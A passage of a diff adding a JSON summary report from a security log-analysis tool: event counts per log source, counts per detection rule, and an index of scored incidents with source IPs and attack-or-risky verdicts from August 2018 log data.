@@ -1,0 +1,4802 @@
+{
+ "generated_at": "2026-11-26T04:40:03Z",
+ "files": [
+  {
+   "file": "/tmp/claude-0/-home-user/66a9a952-f0aa-5846-a102-cca7f5c984a9/scratchpad/dl/bots_out/access.log",
+   "kind": "weblog",
+   "events": 3907
+  },
+  {
+   "file": "/tmp/claude-0/-home-user/66a9a952-f0aa-5846-a102-cca7f5c984a9/scratchpad/dl/bots_out/alb.log",
+   "kind": "alb",
+   "events": 2051
+  },
+  {
+   "file": "/tmp/claude-0/-home-user/66a9a952-f0aa-5846-a102-cca7f5c984a9/scratchpad/dl/bots_out/auth.log",
+   "kind": "sshauth",
+   "events": 65
+  },
+  {
+   "file": "/tmp/claude-0/-home-user/66a9a952-f0aa-5846-a102-cca7f5c984a9/scratchpad/dl/bots_out/cloudtrail.json",
+   "kind": "cloudtrail",
+   "events": 6571
+  },
+  {
+   "file": "/tmp/claude-0/-home-user/66a9a952-f0aa-5846-a102-cca7f5c984a9/scratchpad/dl/bots_out/guardduty_findings.jsonl",
+   "kind": "guardduty",
+   "events": 1
+  },
+  {
+   "file": "/tmp/claude-0/-home-user/66a9a952-f0aa-5846-a102-cca7f5c984a9/scratchpad/dl/bots_out/vpcflow.log",
+   "kind": "vpcflow",
+   "events": 183296
+  }
+ ],
+ "n_events": 195891,
+ "events_by_source": {
+  "weblog": 3907,
+  "alb": 2051,
+  "sshauth": 65,
+  "cloudtrail": 6571,
+  "guardduty": 1,
+  "vpcflow": 183296
+ },
+ "n_flagged": 1052,
+ "n_findings": 63,
+ "rule_counts": {
+  "CT_DISCOVERY_BURST": {
+   "findings": 8,
+   "events": 650
+  },
+  "CT_ACCESS_DENIED_BURST": {
+   "findings": 1,
+   "events": 231
+  },
+  "VPC_REMOTE_ADMIN_EXPOSED": {
+   "findings": 41,
+   "events": 143
+  },
+  "SSH_BRUTE_FORCE": {
+   "findings": 1,
+   "events": 11
+  },
+  "WEBLOG_CMD_INJECTION": {
+   "findings": 4,
+   "events": 4
+  },
+  "CT_CONSOLE_NO_MFA": {
+   "findings": 1,
+   "events": 4
+  },
+  "HOST_ACCOUNT_CREATED": {
+   "findings": 1,
+   "events": 3
+  },
+  "CT_IAM_PERSISTENCE": {
+   "findings": 1,
+   "events": 2
+  },
+  "CT_S3_PUBLIC": {
+   "findings": 1,
+   "events": 1
+  },
+  "WEBLOG_SQLI": {
+   "findings": 1,
+   "events": 1
+  },
+  "CT_SG_OPENED": {
+   "findings": 1,
+   "events": 1
+  },
+  "WEBLOG_SCANNER": {
+   "findings": 1,
+   "events": 1
+  },
+  "GD_FINDING": {
+   "findings": 1,
+   "events": 1
+  }
+ },
+ "n_incidents": 70,
+ "n_groups": 53,
+ "n_patterns": 12,
+ "severity_counts": {
+  "high": 7,
+  "medium": 45,
+  "low": 1
+ },
+ "incident_index": [
+  {
+   "id": "INC-001",
+   "start": "2018-08-20T13:01:28+00:00",
+   "end": "2018-08-20T14:20:54+00:00",
+   "severity": "high",
+   "score": 404,
+   "stages": [
+    "discovery",
+    "initial-access",
+    "exfiltration"
+   ],
+   "src_ips": [
+    "107.77.212.175"
+   ],
+   "n_events": 98,
+   "repeats": 1,
+   "first_seen": "2018-08-20T13:01:28+00:00",
+   "last_seen": "2018-08-20T14:20:54+00:00",
+   "rules": [
+    "CT_CONSOLE_NO_MFA",
+    "CT_DISCOVERY_BURST",
+    "CT_S3_PUBLIC"
+   ],
+   "verdict": "attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-002",
+   "start": "2018-08-20T15:04:44+00:00",
+   "end": "2018-08-20T15:07:32+00:00",
+   "severity": "high",
+   "score": 372,
+   "stages": [
+    "initial-access",
+    "defense-evasion"
+   ],
+   "src_ips": [
+    "107.77.212.175"
+   ],
+   "n_events": 2,
+   "repeats": 1,
+   "first_seen": "2018-08-20T15:04:44+00:00",
+   "last_seen": "2018-08-20T15:07:32+00:00",
+   "rules": [
+    "CT_CONSOLE_NO_MFA",
+    "CT_SG_OPENED"
+   ],
+   "verdict": "attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-003",
+   "start": "2018-08-20T09:16:12+00:00",
+   "end": "2018-08-20T09:28:54+00:00",
+   "severity": "high",
+   "score": 329,
+   "stages": [
+    "discovery",
+    "persistence"
+   ],
+   "src_ips": [
+    "139.198.18.205",
+    "35.153.154.221"
+   ],
+   "n_events": 233,
+   "repeats": 1,
+   "first_seen": "2018-08-20T09:16:12+00:00",
+   "last_seen": "2018-08-20T09:28:54+00:00",
+   "rules": [
+    "CT_ACCESS_DENIED_BURST",
+    "CT_IAM_PERSISTENCE"
+   ],
+   "verdict": "attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-004",
+   "start": "2018-08-20T13:31:22+00:00",
+   "end": "2018-08-20T13:31:22+00:00",
+   "severity": "high",
+   "score": 306,
+   "stages": [
+    "initial-access"
+   ],
+   "src_ips": [
+    "156.202.170.156"
+   ],
+   "n_events": 1,
+   "repeats": 1,
+   "first_seen": "2018-08-20T13:31:22+00:00",
+   "last_seen": "2018-08-20T13:31:22+00:00",
+   "rules": [
+    "WEBLOG_CMD_INJECTION",
+    "WEBLOG_SQLI"
+   ],
+   "verdict": "attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-005",
+   "start": "2018-08-20T09:46:51.920550+00:00",
+   "end": "2018-08-20T09:46:51.920550+00:00",
+   "severity": "high",
+   "score": 296,
+   "stages": [
+    "initial-access"
+   ],
+   "src_ips": [
+    "197.41.194.233"
+   ],
+   "n_events": 1,
+   "repeats": 1,
+   "first_seen": "2018-08-20T09:46:51.920550+00:00",
+   "last_seen": "2018-08-20T09:46:51.920550+00:00",
+   "rules": [
+    "WEBLOG_CMD_INJECTION"
+   ],
+   "verdict": "attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-006",
+   "start": "2018-08-20T09:53:00.514745+00:00",
+   "end": "2018-08-20T09:53:00.514745+00:00",
+   "severity": "high",
+   "score": 296,
+   "stages": [
+    "initial-access"
+   ],
+   "src_ips": [
+    "156.202.167.187"
+   ],
+   "n_events": 1,
+   "repeats": 1,
+   "first_seen": "2018-08-20T09:53:00.514745+00:00",
+   "last_seen": "2018-08-20T09:53:00.514745+00:00",
+   "rules": [
+    "WEBLOG_CMD_INJECTION"
+   ],
+   "verdict": "attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-007",
+   "start": "2018-08-20T11:13:54+00:00",
+   "end": "2018-08-20T11:13:54+00:00",
+   "severity": "high",
+   "score": 296,
+   "stages": [
+    "initial-access"
+   ],
+   "src_ips": [
+    "153.197.134.1"
+   ],
+   "n_events": 1,
+   "repeats": 1,
+   "first_seen": "2018-08-20T11:13:54+00:00",
+   "last_seen": "2018-08-20T11:13:54+00:00",
+   "rules": [
+    "WEBLOG_CMD_INJECTION"
+   ],
+   "verdict": "attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-008",
+   "start": "2018-08-20T09:35:27+00:00",
+   "end": "2018-08-20T09:36:12+00:00",
+   "severity": "medium",
+   "score": 278,
+   "stages": [
+    "discovery",
+    "initial-access"
+   ],
+   "src_ips": [
+    "157.97.121.132"
+   ],
+   "n_events": 8,
+   "repeats": 1,
+   "first_seen": "2018-08-20T09:35:27+00:00",
+   "last_seen": "2018-08-20T09:36:12+00:00",
+   "rules": [
+    "CT_CONSOLE_NO_MFA",
+    "CT_DISCOVERY_BURST"
+   ],
+   "verdict": "attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-015",
+   "start": "2018-08-20T14:47:53+00:00",
+   "end": "2018-08-20T15:03:26+00:00",
+   "severity": "medium",
+   "score": 254,
+   "stages": [
+    "discovery"
+   ],
+   "src_ips": [
+    "34.215.24.225"
+   ],
+   "n_events": 71,
+   "repeats": 5,
+   "first_seen": "2018-08-20T09:01:54+00:00",
+   "last_seen": "2018-08-20T15:03:26+00:00",
+   "rules": [
+    "CT_DISCOVERY_BURST"
+   ],
+   "verdict": "attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-068",
+   "start": "2018-08-20T14:25:17+00:00",
+   "end": "2018-08-20T14:25:17+00:00",
+   "severity": "medium",
+   "score": 246,
+   "stages": [
+    "persistence"
+   ],
+   "src_ips": [],
+   "n_events": 1,
+   "repeats": 3,
+   "first_seen": "2018-08-20T13:33:19+00:00",
+   "last_seen": "2018-08-20T14:25:17+00:00",
+   "rules": [
+    "HOST_ACCOUNT_CREATED"
+   ],
+   "verdict": "attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-069",
+   "start": "2018-08-20T14:54:09+00:00",
+   "end": "2018-08-20T14:54:17+00:00",
+   "severity": "medium",
+   "score": 204,
+   "stages": [
+    "credential-access"
+   ],
+   "src_ips": [
+    "167.114.13.150"
+   ],
+   "n_events": 11,
+   "repeats": 1,
+   "first_seen": "2018-08-20T14:54:09+00:00",
+   "last_seen": "2018-08-20T14:54:17+00:00",
+   "rules": [
+    "SSH_BRUTE_FORCE"
+   ],
+   "verdict": "attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-070",
+   "start": "2018-08-20T09:31:28+00:00",
+   "end": "2018-08-20T09:31:28+00:00",
+   "severity": "low",
+   "score": 146,
+   "stages": [
+    "discovery"
+   ],
+   "src_ips": [
+    "141.212.122.144"
+   ],
+   "n_events": 1,
+   "repeats": 1,
+   "first_seen": "2018-08-20T09:31:28+00:00",
+   "last_seen": "2018-08-20T09:31:28+00:00",
+   "rules": [
+    "WEBLOG_SCANNER"
+   ],
+   "verdict": "attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-009",
+   "start": "2018-08-20T13:50:05+00:00",
+   "end": "2018-08-20T13:51:05+00:00",
+   "severity": "medium",
+   "score": 258,
+   "stages": [
+    "initial-access"
+   ],
+   "src_ips": [
+    "122.112.243.11"
+   ],
+   "n_events": 3,
+   "repeats": 1,
+   "first_seen": "2018-08-20T13:50:05+00:00",
+   "last_seen": "2018-08-20T13:51:05+00:00",
+   "rules": [
+    "GD_FINDING",
+    "VPC_REMOTE_ADMIN_EXPOSED"
+   ],
+   "verdict": "risky_not_attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-012",
+   "start": "2018-08-20T11:33:21+00:00",
+   "end": "2018-08-20T11:33:21+00:00",
+   "severity": "medium",
+   "score": 254,
+   "stages": [
+    "initial-access"
+   ],
+   "src_ips": [
+    "221.194.44.232"
+   ],
+   "n_events": 10,
+   "repeats": 1,
+   "first_seen": "2018-08-20T11:33:21+00:00",
+   "last_seen": "2018-08-20T11:33:21+00:00",
+   "rules": [
+    "VPC_REMOTE_ADMIN_EXPOSED"
+   ],
+   "verdict": "risky_not_attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-016",
+   "start": "2018-08-20T11:31:22+00:00",
+   "end": "2018-08-20T11:51:21+00:00",
+   "severity": "medium",
+   "score": 253,
+   "stages": [
+    "initial-access"
+   ],
+   "src_ips": [
+    "119.249.54.217"
+   ],
+   "n_events": 8,
+   "repeats": 1,
+   "first_seen": "2018-08-20T11:31:22+00:00",
+   "last_seen": "2018-08-20T11:51:21+00:00",
+   "rules": [
+    "VPC_REMOTE_ADMIN_EXPOSED"
+   ],
+   "verdict": "risky_not_attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-017",
+   "start": "2018-08-20T11:01:23+00:00",
+   "end": "2018-08-20T11:01:23+00:00",
+   "severity": "medium",
+   "score": 251,
+   "stages": [
+    "initial-access"
+   ],
+   "src_ips": [
+    "185.143.223.202"
+   ],
+   "n_events": 6,
+   "repeats": 1,
+   "first_seen": "2018-08-20T11:01:23+00:00",
+   "last_seen": "2018-08-20T11:01:23+00:00",
+   "rules": [
+    "VPC_REMOTE_ADMIN_EXPOSED"
+   ],
+   "verdict": "risky_not_attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-019",
+   "start": "2018-08-20T13:15:32+00:00",
+   "end": "2018-08-20T13:17:50+00:00",
+   "severity": "medium",
+   "score": 251,
+   "stages": [
+    "initial-access"
+   ],
+   "src_ips": [
+    "118.212.143.46"
+   ],
+   "n_events": 6,
+   "repeats": 1,
+   "first_seen": "2018-08-20T13:15:32+00:00",
+   "last_seen": "2018-08-20T13:17:50+00:00",
+   "rules": [
+    "VPC_REMOTE_ADMIN_EXPOSED"
+   ],
+   "verdict": "risky_not_attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-018",
+   "start": "2018-08-20T11:32:21+00:00",
+   "end": "2018-08-20T11:50:21+00:00",
+   "severity": "medium",
+   "score": 251,
+   "stages": [
+    "initial-access"
+   ],
+   "src_ips": [
+    "122.226.181.164"
+   ],
+   "n_events": 6,
+   "repeats": 2,
+   "first_seen": "2018-08-20T11:32:21+00:00",
+   "last_seen": "2018-08-20T12:50:25+00:00",
+   "rules": [
+    "VPC_REMOTE_ADMIN_EXPOSED"
+   ],
+   "verdict": "risky_not_attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-020",
+   "start": "2018-08-20T15:06:24+00:00",
+   "end": "2018-08-20T15:07:25+00:00",
+   "severity": "medium",
+   "score": 251,
+   "stages": [
+    "initial-access"
+   ],
+   "src_ips": [
+    "5.101.40.81"
+   ],
+   "n_events": 6,
+   "repeats": 2,
+   "first_seen": "2018-08-20T13:10:30+00:00",
+   "last_seen": "2018-08-20T15:07:25+00:00",
+   "rules": [
+    "VPC_REMOTE_ADMIN_EXPOSED"
+   ],
+   "verdict": "risky_not_attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-022",
+   "start": "2018-08-20T11:36:21+00:00",
+   "end": "2018-08-20T11:49:21+00:00",
+   "severity": "medium",
+   "score": 249,
+   "stages": [
+    "initial-access"
+   ],
+   "src_ips": [
+    "122.226.181.167"
+   ],
+   "n_events": 4,
+   "repeats": 1,
+   "first_seen": "2018-08-20T11:36:21+00:00",
+   "last_seen": "2018-08-20T11:49:21+00:00",
+   "rules": [
+    "VPC_REMOTE_ADMIN_EXPOSED"
+   ],
+   "verdict": "risky_not_attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-023",
+   "start": "2018-08-20T11:38:21+00:00",
+   "end": "2018-08-20T11:46:21+00:00",
+   "severity": "medium",
+   "score": 249,
+   "stages": [
+    "initial-access"
+   ],
+   "src_ips": [
+    "221.194.44.211"
+   ],
+   "n_events": 4,
+   "repeats": 1,
+   "first_seen": "2018-08-20T11:38:21+00:00",
+   "last_seen": "2018-08-20T11:46:21+00:00",
+   "rules": [
+    "VPC_REMOTE_ADMIN_EXPOSED"
+   ],
+   "verdict": "risky_not_attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-025",
+   "start": "2018-08-20T14:09:26+00:00",
+   "end": "2018-08-20T14:09:26+00:00",
+   "severity": "medium",
+   "score": 249,
+   "stages": [
+    "initial-access"
+   ],
+   "src_ips": [
+    "113.162.80.84"
+   ],
+   "n_events": 4,
+   "repeats": 1,
+   "first_seen": "2018-08-20T14:09:26+00:00",
+   "last_seen": "2018-08-20T14:09:26+00:00",
+   "rules": [
+    "VPC_REMOTE_ADMIN_EXPOSED"
+   ],
+   "verdict": "risky_not_attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-026",
+   "start": "2018-08-20T15:09:25+00:00",
+   "end": "2018-08-20T15:17:36+00:00",
+   "severity": "medium",
+   "score": 249,
+   "stages": [
+    "initial-access"
+   ],
+   "src_ips": [
+    "217.61.6.175"
+   ],
+   "n_events": 4,
+   "repeats": 1,
+   "first_seen": "2018-08-20T15:09:25+00:00",
+   "last_seen": "2018-08-20T15:17:36+00:00",
+   "rules": [
+    "VPC_REMOTE_ADMIN_EXPOSED"
+   ],
+   "verdict": "risky_not_attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-021",
+   "start": "2018-08-20T11:23:21+00:00",
+   "end": "2018-08-20T11:24:26+00:00",
+   "severity": "medium",
+   "score": 249,
+   "stages": [
+    "initial-access"
+   ],
+   "src_ips": [
+    "178.128.150.169"
+   ],
+   "n_events": 4,
+   "repeats": 2,
+   "first_seen": "2018-08-20T11:23:21+00:00",
+   "last_seen": "2018-08-20T14:33:59+00:00",
+   "rules": [
+    "VPC_REMOTE_ADMIN_EXPOSED"
+   ],
+   "verdict": "risky_not_attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-024",
+   "start": "2018-08-20T12:51:36+00:00",
+   "end": "2018-08-20T12:51:36+00:00",
+   "severity": "medium",
+   "score": 249,
+   "stages": [
+    "initial-access"
+   ],
+   "src_ips": [
+    "80.211.17.200"
+   ],
+   "n_events": 4,
+   "repeats": 2,
+   "first_seen": "2018-08-20T12:51:36+00:00",
+   "last_seen": "2018-08-20T14:09:26+00:00",
+   "rules": [
+    "VPC_REMOTE_ADMIN_EXPOSED"
+   ],
+   "verdict": "risky_not_attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-027",
+   "start": "2018-08-20T09:06:16+00:00",
+   "end": "2018-08-20T09:06:16+00:00",
+   "severity": "medium",
+   "score": 247,
+   "stages": [
+    "initial-access"
+   ],
+   "src_ips": [
+    "217.61.105.67"
+   ],
+   "n_events": 2,
+   "repeats": 1,
+   "first_seen": "2018-08-20T09:06:16+00:00",
+   "last_seen": "2018-08-20T09:06:16+00:00",
+   "rules": [
+    "VPC_REMOTE_ADMIN_EXPOSED"
+   ],
+   "verdict": "risky_not_attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-028",
+   "start": "2018-08-20T09:22:14+00:00",
+   "end": "2018-08-20T09:22:14+00:00",
+   "severity": "medium",
+   "score": 247,
+   "stages": [
+    "initial-access"
+   ],
+   "src_ips": [
+    "180.250.182.26"
+   ],
+   "n_events": 2,
+   "repeats": 1,
+   "first_seen": "2018-08-20T09:22:14+00:00",
+   "last_seen": "2018-08-20T09:22:14+00:00",
+   "rules": [
+    "VPC_REMOTE_ADMIN_EXPOSED"
+   ],
+   "verdict": "risky_not_attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-030",
+   "start": "2018-08-20T11:05:27+00:00",
+   "end": "2018-08-20T11:05:27+00:00",
+   "severity": "medium",
+   "score": 247,
+   "stages": [
+    "initial-access"
+   ],
+   "src_ips": [
+    "5.228.65.234"
+   ],
+   "n_events": 2,
+   "repeats": 1,
+   "first_seen": "2018-08-20T11:05:27+00:00",
+   "last_seen": "2018-08-20T11:05:27+00:00",
+   "rules": [
+    "VPC_REMOTE_ADMIN_EXPOSED"
+   ],
+   "verdict": "risky_not_attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-031",
+   "start": "2018-08-20T11:14:25+00:00",
+   "end": "2018-08-20T11:14:25+00:00",
+   "severity": "medium",
+   "score": 247,
+   "stages": [
+    "initial-access"
+   ],
+   "src_ips": [
+    "213.74.138.66"
+   ],
+   "n_events": 2,
+   "repeats": 1,
+   "first_seen": "2018-08-20T11:14:25+00:00",
+   "last_seen": "2018-08-20T11:14:25+00:00",
+   "rules": [
+    "VPC_REMOTE_ADMIN_EXPOSED"
+   ],
+   "verdict": "risky_not_attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-033",
+   "start": "2018-08-20T11:31:24+00:00",
+   "end": "2018-08-20T11:31:24+00:00",
+   "severity": "medium",
+   "score": 247,
+   "stages": [
+    "initial-access"
+   ],
+   "src_ips": [
+    "95.84.246.183"
+   ],
+   "n_events": 2,
+   "repeats": 1,
+   "first_seen": "2018-08-20T11:31:24+00:00",
+   "last_seen": "2018-08-20T11:31:24+00:00",
+   "rules": [
+    "VPC_REMOTE_ADMIN_EXPOSED"
+   ],
+   "verdict": "risky_not_attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-034",
+   "start": "2018-08-20T11:34:21+00:00",
+   "end": "2018-08-20T11:34:21+00:00",
+   "severity": "medium",
+   "score": 247,
+   "stages": [
+    "initial-access"
+   ],
+   "src_ips": [
+    "122.226.181.166"
+   ],
+   "n_events": 2,
+   "repeats": 1,
+   "first_seen": "2018-08-20T11:34:21+00:00",
+   "last_seen": "2018-08-20T11:34:21+00:00",
+   "rules": [
+    "VPC_REMOTE_ADMIN_EXPOSED"
+   ],
+   "verdict": "risky_not_attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-035",
+   "start": "2018-08-20T11:39:29+00:00",
+   "end": "2018-08-20T11:39:29+00:00",
+   "severity": "medium",
+   "score": 247,
+   "stages": [
+    "initial-access"
+   ],
+   "src_ips": [
+    "106.43.254.90"
+   ],
+   "n_events": 2,
+   "repeats": 1,
+   "first_seen": "2018-08-20T11:39:29+00:00",
+   "last_seen": "2018-08-20T11:39:29+00:00",
+   "rules": [
+    "VPC_REMOTE_ADMIN_EXPOSED"
+   ],
+   "verdict": "risky_not_attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-038",
+   "start": "2018-08-20T11:49:21+00:00",
+   "end": "2018-08-20T11:49:21+00:00",
+   "severity": "medium",
+   "score": 247,
+   "stages": [
+    "initial-access"
+   ],
+   "src_ips": [
+    "221.194.47.236"
+   ],
+   "n_events": 2,
+   "repeats": 1,
+   "first_seen": "2018-08-20T11:49:21+00:00",
+   "last_seen": "2018-08-20T11:49:21+00:00",
+   "rules": [
+    "VPC_REMOTE_ADMIN_EXPOSED"
+   ],
+   "verdict": "risky_not_attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-040",
+   "start": "2018-08-20T13:02:54+00:00",
+   "end": "2018-08-20T13:02:54+00:00",
+   "severity": "medium",
+   "score": 247,
+   "stages": [
+    "initial-access"
+   ],
+   "src_ips": [
+    "121.194.2.251"
+   ],
+   "n_events": 2,
+   "repeats": 1,
+   "first_seen": "2018-08-20T13:02:54+00:00",
+   "last_seen": "2018-08-20T13:02:54+00:00",
+   "rules": [
+    "VPC_REMOTE_ADMIN_EXPOSED"
+   ],
+   "verdict": "risky_not_attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-043",
+   "start": "2018-08-20T13:09:49+00:00",
+   "end": "2018-08-20T13:09:49+00:00",
+   "severity": "medium",
+   "score": 247,
+   "stages": [
+    "initial-access"
+   ],
+   "src_ips": [
+    "142.44.242.62"
+   ],
+   "n_events": 2,
+   "repeats": 1,
+   "first_seen": "2018-08-20T13:09:49+00:00",
+   "last_seen": "2018-08-20T13:09:49+00:00",
+   "rules": [
+    "VPC_REMOTE_ADMIN_EXPOSED"
+   ],
+   "verdict": "risky_not_attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-045",
+   "start": "2018-08-20T13:11:25+00:00",
+   "end": "2018-08-20T13:11:25+00:00",
+   "severity": "medium",
+   "score": 247,
+   "stages": [
+    "initial-access"
+   ],
+   "src_ips": [
+    "42.7.26.49"
+   ],
+   "n_events": 2,
+   "repeats": 1,
+   "first_seen": "2018-08-20T13:11:25+00:00",
+   "last_seen": "2018-08-20T13:11:25+00:00",
+   "rules": [
+    "VPC_REMOTE_ADMIN_EXPOSED"
+   ],
+   "verdict": "risky_not_attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-046",
+   "start": "2018-08-20T13:22:25+00:00",
+   "end": "2018-08-20T13:22:25+00:00",
+   "severity": "medium",
+   "score": 247,
+   "stages": [
+    "initial-access"
+   ],
+   "src_ips": [
+    "103.79.143.113"
+   ],
+   "n_events": 2,
+   "repeats": 1,
+   "first_seen": "2018-08-20T13:22:25+00:00",
+   "last_seen": "2018-08-20T13:22:25+00:00",
+   "rules": [
+    "VPC_REMOTE_ADMIN_EXPOSED"
+   ],
+   "verdict": "risky_not_attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-048",
+   "start": "2018-08-20T13:23:53+00:00",
+   "end": "2018-08-20T13:23:53+00:00",
+   "severity": "medium",
+   "score": 247,
+   "stages": [
+    "initial-access"
+   ],
+   "src_ips": [
+    "117.102.68.188"
+   ],
+   "n_events": 2,
+   "repeats": 1,
+   "first_seen": "2018-08-20T13:23:53+00:00",
+   "last_seen": "2018-08-20T13:23:53+00:00",
+   "rules": [
+    "VPC_REMOTE_ADMIN_EXPOSED"
+   ],
+   "verdict": "risky_not_attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-049",
+   "start": "2018-08-20T13:29:47+00:00",
+   "end": "2018-08-20T13:29:47+00:00",
+   "severity": "medium",
+   "score": 247,
+   "stages": [
+    "initial-access"
+   ],
+   "src_ips": [
+    "142.196.208.188"
+   ],
+   "n_events": 2,
+   "repeats": 1,
+   "first_seen": "2018-08-20T13:29:47+00:00",
+   "last_seen": "2018-08-20T13:29:47+00:00",
+   "rules": [
+    "VPC_REMOTE_ADMIN_EXPOSED"
+   ],
+   "verdict": "risky_not_attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-050",
+   "start": "2018-08-20T13:45:39+00:00",
+   "end": "2018-08-20T13:45:39+00:00",
+   "severity": "medium",
+   "score": 247,
+   "stages": [
+    "initial-access"
+   ],
+   "src_ips": [
+    "50.63.67.38"
+   ],
+   "n_events": 2,
+   "repeats": 1,
+   "first_seen": "2018-08-20T13:45:39+00:00",
+   "last_seen": "2018-08-20T13:45:39+00:00",
+   "rules": [
+    "VPC_REMOTE_ADMIN_EXPOSED"
+   ],
+   "verdict": "risky_not_attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-052",
+   "start": "2018-08-20T13:53:26+00:00",
+   "end": "2018-08-20T13:53:26+00:00",
+   "severity": "medium",
+   "score": 247,
+   "stages": [
+    "initial-access"
+   ],
+   "src_ips": [
+    "221.194.47.205"
+   ],
+   "n_events": 2,
+   "repeats": 1,
+   "first_seen": "2018-08-20T13:53:26+00:00",
+   "last_seen": "2018-08-20T13:53:26+00:00",
+   "rules": [
+    "VPC_REMOTE_ADMIN_EXPOSED"
+   ],
+   "verdict": "risky_not_attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-053",
+   "start": "2018-08-20T13:53:26+00:00",
+   "end": "2018-08-20T13:53:26+00:00",
+   "severity": "medium",
+   "score": 247,
+   "stages": [
+    "initial-access"
+   ],
+   "src_ips": [
+    "221.194.47.239"
+   ],
+   "n_events": 2,
+   "repeats": 1,
+   "first_seen": "2018-08-20T13:53:26+00:00",
+   "last_seen": "2018-08-20T13:53:26+00:00",
+   "rules": [
+    "VPC_REMOTE_ADMIN_EXPOSED"
+   ],
+   "verdict": "risky_not_attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-054",
+   "start": "2018-08-20T13:58:26+00:00",
+   "end": "2018-08-20T13:58:26+00:00",
+   "severity": "medium",
+   "score": 247,
+   "stages": [
+    "initial-access"
+   ],
+   "src_ips": [
+    "121.18.238.115"
+   ],
+   "n_events": 2,
+   "repeats": 1,
+   "first_seen": "2018-08-20T13:58:26+00:00",
+   "last_seen": "2018-08-20T13:58:26+00:00",
+   "rules": [
+    "VPC_REMOTE_ADMIN_EXPOSED"
+   ],
+   "verdict": "risky_not_attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-057",
+   "start": "2018-08-20T14:33:45+00:00",
+   "end": "2018-08-20T14:33:45+00:00",
+   "severity": "medium",
+   "score": 247,
+   "stages": [
+    "initial-access"
+   ],
+   "src_ips": [
+    "188.166.182.156"
+   ],
+   "n_events": 2,
+   "repeats": 1,
+   "first_seen": "2018-08-20T14:33:45+00:00",
+   "last_seen": "2018-08-20T14:33:45+00:00",
+   "rules": [
+    "VPC_REMOTE_ADMIN_EXPOSED"
+   ],
+   "verdict": "risky_not_attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-059",
+   "start": "2018-08-20T14:34:53+00:00",
+   "end": "2018-08-20T14:34:53+00:00",
+   "severity": "medium",
+   "score": 247,
+   "stages": [
+    "initial-access"
+   ],
+   "src_ips": [
+    "139.220.192.57"
+   ],
+   "n_events": 2,
+   "repeats": 1,
+   "first_seen": "2018-08-20T14:34:53+00:00",
+   "last_seen": "2018-08-20T14:34:53+00:00",
+   "rules": [
+    "VPC_REMOTE_ADMIN_EXPOSED"
+   ],
+   "verdict": "risky_not_attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-060",
+   "start": "2018-08-20T14:40:36+00:00",
+   "end": "2018-08-20T14:40:36+00:00",
+   "severity": "medium",
+   "score": 247,
+   "stages": [
+    "initial-access"
+   ],
+   "src_ips": [
+    "122.228.10.51"
+   ],
+   "n_events": 2,
+   "repeats": 1,
+   "first_seen": "2018-08-20T14:40:36+00:00",
+   "last_seen": "2018-08-20T14:40:36+00:00",
+   "rules": [
+    "VPC_REMOTE_ADMIN_EXPOSED"
+   ],
+   "verdict": "risky_not_attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-061",
+   "start": "2018-08-20T14:52:27+00:00",
+   "end": "2018-08-20T14:52:27+00:00",
+   "severity": "medium",
+   "score": 247,
+   "stages": [
+    "initial-access"
+   ],
+   "src_ips": [
+    "115.238.245.2"
+   ],
+   "n_events": 2,
+   "repeats": 1,
+   "first_seen": "2018-08-20T14:52:27+00:00",
+   "last_seen": "2018-08-20T14:52:27+00:00",
+   "rules": [
+    "VPC_REMOTE_ADMIN_EXPOSED"
+   ],
+   "verdict": "risky_not_attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-029",
+   "start": "2018-08-20T09:49:25+00:00",
+   "end": "2018-08-20T09:57:25+00:00",
+   "severity": "medium",
+   "score": 247,
+   "stages": [
+    "initial-access"
+   ],
+   "src_ips": [
+    "101.69.228.206"
+   ],
+   "n_events": 2,
+   "repeats": 2,
+   "first_seen": "2018-08-20T09:49:25+00:00",
